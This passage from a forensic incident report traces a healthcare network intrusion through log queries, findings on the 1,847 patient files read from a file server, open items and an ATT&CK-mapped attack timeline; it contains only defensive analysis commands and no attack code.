{"ts":"2026-04-17T14:23:28Z","host":"CS-WS-101","event_id":13}
{"ts":"2026-04-19T00:03:44Z","host":"CS-WS-104","event_id":1}
{"ts":"2026-04-19T00:12:16Z","host":"CS-WS-107","event_id":1}
{"ts":"2026-04-19T00:17:35Z","host":"CS-WS-112","event_id":1}
{"ts":"2026-04-19T02:14:01Z","host":"FILE-SVR-01","event_id":1,"pid":5412}
{"ts":"2026-04-20T18:02:18Z","host":"SCHED-SVR-01","event_id":1,"pid":5920}
```

Conclusion: the service `WinHealthSvc` -> `C:\ProgramData\Microsoft\svchost32.exe` was installed on six hosts, not three. SIEM rule `wz-edr-200214` alerted on the three workstations (CS-WS-104/107/112). It did not alert on CS-WS-101, where the service key was written by services.exe under SYSTEM (event 13 rather than an `sc create` command line), or on the two servers, which forward Sysmon but sit outside the rule's `Workstations` host group. That is a detection coverage gap for the post-incident review. FILE-SVR-01 ran the beacon from 02:14:01Z to the end of the attacker session at 02:41:18Z. SCHED-SVR-01 has run it since **2026-04-20T18:02:18Z**, which matches Torres's report of a saturated disk "for about ninety minutes" before 19:43Z. Torres said the alert fired "this afternoon". The service creations themselves were on 2026-04-19 around midnight. The alert record is not among the five artifacts. Either SIEM ingestion was delayed or the alert fired on later service activity. Open item 2.
ATT&CK: T1543.003, T1569.002
Certainty: service on six hosts: confirmed; reason the rule missed three hosts: probable; alert timing: possible (needs the SIEM alert export)

## File server analysis: fileserver_access.evtx

```text
$ evtx_dump -o jsonl fileserver_access.evtx > fs.jsonl     # conversion of ART-009 to JSON (derived file hashed)
```

### Finding FS-001: Window of patient file access

```text
$ jq -c 'select(.event_id==4663 and .user=="MEDDEFENSE\\jdoe") | .ts' fs.jsonl | sort | sed -n '1p;$p'
"2026-04-19T02:14:01.214Z"
"2026-04-19T02:41:12.894Z"
$ jq -c 'select(.logon_id=="0xAF12C4B8" and (.event_id==4624 or .event_id==4634)) | {ts,event_id,logon_type,src_ip,auth_package}' fs.jsonl
{"ts":"2026-04-19T02:14:00.842Z","event_id":4624,"logon_type":3,"src_ip":"10.30.12.101","auth_package":"Kerberos"}
{"ts":"2026-04-19T02:41:18.004Z","event_id":4634}
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .process_name' fs.jsonl | sort | uniq -c
   1847 \Device\HarddiskVolume3\ProgramData\Microsoft\svchost32.exe
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .access_mask' fs.jsonl | sort | uniq -c
   1847 0x1
```

Conclusion: the attacker read patient files on FILE-SVR-01 for **27 min 11 s, from 2026-04-19T02:14:01Z to 02:41:12Z** (Sunday, 02:14 to 02:41 UTC), inside one network logon session `0xAF12C4B8` that opened at 02:14:00.842Z from CS-WS-101 (10.30.12.101) and closed at 02:41:18Z. Every read was done by `svchost32.exe` running on the file server itself (SYS-004, PID 5412), with access mask `0x1` (ReadData): files were read, none were changed or deleted. The attacker started its own beacon on the server instead of browsing the share from a workstation, and the 2.4 MB transfer to the C2 at 02:14:22Z comes from that same server process (PROXY-003). The rate (about 1.1 files per second, sub-second intervals) is automated, not a person reading. The time (02:14 on a Sunday) has no link to any scheduled job.
ATT&CK: T1039, T1005, T1119 (automated collection)
Certainty: confirmed

### Finding FS-002: Count and categories of the 1,847 records

```text
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .object_name' fs.jsonl | wc -l
1847
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .object_name' fs.jsonl | sort -u | wc -l
1847
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .object_name' fs.jsonl \
   | sed -E 's#^D:\\clinical\\(labs|notes)\\.*#\1#' | sort | uniq -c
   1104 labs
    743 notes
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .object_name | select(test("\\\\labs\\\\"))' fs.jsonl \
   | grep -oE '20[0-9]{2}-[0-9]{2}-[0-9]{2}' | sort | uniq -c
    268 2026-04-15
    279 2026-04-16
    281 2026-04-17
    276 2026-04-18
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .object_name | select(test("\\\\notes\\\\"))' fs.jsonl \
   | sed -E 's#.*progress_[0-9-]+_([A-Za-z]+(_[0-9]+)?)_[0-9]+\.pdf#\1#' | sort | uniq -c
    318 ER_admit
    425 floor_4
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .ts[11:16]' fs.jsonl \
   | awk '{b=($1<"02:20")?"02:14-02:19":($1<"02:30")?"02:20-02:29":"02:30-02:41"; c[b]++} END{for(k in c) print c[k], k}' | sort -k2
    412 02:14-02:19
    701 02:20-02:29
    734 02:30-02:41
$ jq -r 'select(.event_id==4663 and .logon_id=="0xAF12C4B8") | .object_name' fs.jsonl | grep -vciE '\.pdf$'
0
```

| Category | Path | Files | Content (by folder and file naming) | Access time (UTC, 2026-04-19) |
|---|---|---|---|---|
| Lab results | `D:\clinical\labs\2026-04-15_panel_*.pdf` | 268 | Lab panel reports, 15 April | 02:14-02:41, folder order labs first then interleaved |
| Lab results | `D:\clinical\labs\2026-04-16_panel_*.pdf` | 279 | Lab panel reports, 16 April | same |
| Lab results | `D:\clinical\labs\2026-04-17_panel_*.pdf` | 281 | Lab panel reports, 17 April | same |
| Lab results | `D:\clinical\labs\2026-04-18_panel_*.pdf` | 276 | Lab panel reports, 18 April | same |
| Clinical notes | `D:\clinical\notes\progress_*_ER_admit_*.pdf` | 318 | Emergency department admission progress notes | 02:21 onwards |
| Clinical notes | `D:\clinical\notes\progress_*_floor_4_*.pdf` | 425 | Inpatient floor 4 progress notes | through 02:41:12 |
| **Total** | | **1,847** | 1,104 lab results + 743 clinical notes, 1,847 distinct files, all PDF, each read once | 412 / 701 / 734 per time band |

Conclusion: 1,847 distinct PDF files, each read exactly once, in two shares: 1,104 lab result reports from four consecutive days (15-18 April 2026) and 743 clinical progress notes (318 ED admissions, 425 inpatient floor 4). The attacker took everything recent in the two folders, not specific patients. **Files are not patients**: one patient can have several lab panels and notes. The number of individuals is not in the event log. It must come from mapping each file to its MRN through the document index (Health Information Management, requested 22:40Z). That number drives HIPAA notification (hipaa_assessment.md).
ATT&CK: T1039, T1119
Certainty: counts and categories: confirmed; content type from file naming: probable (to confirm by opening a sample of files from the triage collection); number of patients: not established

### Finding FS-003: Accounts used to authenticate

```text
$ jq -r 'select(.event_id==4663 and .ts>="2026-04-19T02:14:00Z" and .ts<="2026-04-19T02:41:13Z") | .user' fs.jsonl | sort | uniq -c
   1847 MEDDEFENSE\jdoe
$ jq -c 'select(.event_id==4624 and .src_ip=="10.30.12.101" and .ts>="2026-04-17T14:00:00Z") | {ts,user,logon_type,auth_package,logon_id}' fs.jsonl
{"ts":"2026-04-19T02:14:00.842Z","user":"MEDDEFENSE\\jdoe","logon_type":3,"auth_package":"Kerberos","logon_id":"0xAF12C4B8"}
$ jq -c 'select(.event_id==4663 and (.process_name|test("svchost32"))) | .user' fs.jsonl | sort -u
"MEDDEFENSE\\jdoe"
$ jq -c 'select((.event_id==4624 or .event_id==4663) and (.src_ip=="10.30.12.104" or .src_ip=="10.30.12.107" or .src_ip=="10.30.12.112"))' fs.jsonl | wc -l
0
```

Conclusion: one account was used, **MEDDEFENSE\jdoe**, in one Kerberos network logon from CS-WS-101. No other user account touched these files in the window, and no logon to the file server came from the three laterally compromised workstations. jdoe is the scheduling / on-call clinical coordinator whose workstation was phished. The user provisioning record gives her no clinical role needing `\clinical\labs` or `\clinical\notes`, yet the share ACL let her read them (over-broad ACL, access gap). Kerberos, not NTLM, was used here: the attacker either used jdoe's live logon session on CS-WS-101 or turned her stolen hash into a ticket (overpass-the-hash). Either way the ticket was issued to jdoe's identity, so the account reset plus the krbtgt reset in eradication cover it. "Clinical accounts used": only jdoe. No clinician account was used to reach the PHI.
ATT&CK: T1078.002, T1550.002 / T1550.003
Certainty: account: confirmed; mechanism (session reuse vs overpass-the-hash): possible, needs the DC 4768/4769 events for jdoe around 02:14Z

## Open items

1. Count of individual patients behind the 1,847 files (HIM mapping, owner Helena Reyes / Privacy Officer). Needed for the notification letters and HHS report.
2. SIEM alert export for `wz-edr-200214` to settle the "this afternoon" timing.
3. Memory analysis of ART-003 to ART-007 (other hosts). Expected to repeat MEM-001 to MEM-004. ART-006 (SCHED-SVR-01) first, to confirm or rule out encryption in progress.
4. Interview the on-call nurse about "files look different" (not reproduced on disk).
5. Target Security logs (4624 auth package) from ART-012 to ART-014 to confirm NTLM pass-the-hash.
6. Beacon config extraction from `beacon_payload.bin` (watermark, sleep, spawn-to, any second C2).

## Attack chain summary

| Stage | Time range (UTC) | Technique | Hosts | Evidence | Certainty |
|---|---|---|---|---|---|
| Phishing delivery (macro attachment downloaded from Outlook on the web) | 2026-04-17T14:17:48Z - 14:18:04Z | T1566.001 | CS-WS-101 | PROXY-001, DISK-002, DISK-003 | confirmed |
| User opens document, macro runs | 2026-04-17T14:17:52Z - 14:22:14Z | T1204.002, T1059.005 | CS-WS-101 | MEM-001, MEM-002, DISK-003, SYS-001 | confirmed |
| PowerShell downloader fetches and runs `inv_payload.ps1` | 2026-04-17T14:22:14Z - 14:23:02Z | T1059.001, T1105 | CS-WS-101 | MEM-002, DISK-003, PROXY-001, SYS-001 | confirmed |
| Stager `svchost32.exe` written and started, beacon DLL loaded reflectively | 2026-04-17T14:23:02Z - 14:23:14Z | T1036.005, T1055.001, T1620 | CS-WS-101 | MEM-001, MEM-004, DISK-004, SYS-001 | confirmed |
| Persistence (service WinHealthSvc + Run key) | 2026-04-17T14:23:28Z - 14:23:31Z | T1543.003, T1547.001 | CS-WS-101 | DISK-005, SYS-001 | confirmed |
| C2 established, 60 s beacon over HTTPS to look-alike domain | 2026-04-17T14:23:07Z - 2026-04-20T20:31:05Z | T1071.001, T1573.002 | all six | MEM-003, PROXY-002 | confirmed |
| Credential access (LSASS read, SAM hashes) | 2026-04-17T14:25:02Z | T1003.001, T1003.002 | CS-WS-101 | MEM-005, SYS-001 | confirmed |
| Keylogging | 2026-04-18T09:41:02Z - 09:41:14Z | T1056.001 | CS-WS-101 | PROXY-003, DISK-002 | probable |
| Lateral movement with jdoe's credentials, remote service install | 2026-04-19T00:03:39Z - 00:18:02Z | T1021.002, T1569.002, T1550.002 | CS-WS-104, CS-WS-107, CS-WS-112 | SYS-002, SYS-004, PROXY-002 | confirmed (PtH method probable) |
| Beacon started on file server | 2026-04-19T02:14:00Z - 02:14:04Z | T1569.002, T1078.002 | FILE-SVR-01 | FS-001, FS-003, SYS-004 | confirmed |
| Collection of 1,847 patient PDFs (1,104 labs, 743 notes) | 2026-04-19T02:14:01Z - 02:41:12Z | T1039, T1119 | FILE-SVR-01 | FS-001, FS-002 | confirmed |
| Exfiltration over C2 (2.4 MB, content unknown) | 2026-04-19T02:14:22Z | T1041 | FILE-SVR-01 | PROXY-003 | probable |
| Ransomware staging script dropped in System32 | 2026-04-20T14:23:18Z - 14:26:14Z | T1105, T1074.001 | CS-WS-101, CS-WS-104, CS-WS-107, CS-WS-112 | SYS-003, DISK-002 | confirmed |
| Beacon started on scheduling server, disk saturation | 2026-04-20T18:02:18Z - 20:21:30Z | T1569.002 (T1486 under investigation) | SCHED-SVR-01 | SYS-004, PROXY-002, Torres report | confirmed (encryption: possible) |
| Pre-ransomware tasking over C2 | 2026-04-20T18:12:18Z | T1071.001 | CS-WS-101 | PROXY-003, MEM-003 | possible |
| Containment: C2 cut, hosts isolated, staged scripts blocked | 2026-04-20T20:21:30Z - 20:37:10Z | n/a (response) | all six | containment_execution.md C-01 to C-18 | confirmed |
